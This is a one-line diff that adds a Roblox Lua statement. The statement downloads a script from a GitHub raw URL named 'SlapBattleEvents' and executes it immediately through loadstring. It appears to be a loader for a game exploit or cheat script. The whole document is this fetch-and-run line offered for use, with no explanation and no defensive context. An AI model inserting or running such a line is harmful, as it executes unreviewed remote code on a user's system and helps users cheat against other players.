@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/cool83birdcarfly02six/SlapBattleEvents/main/README.md'),true))()
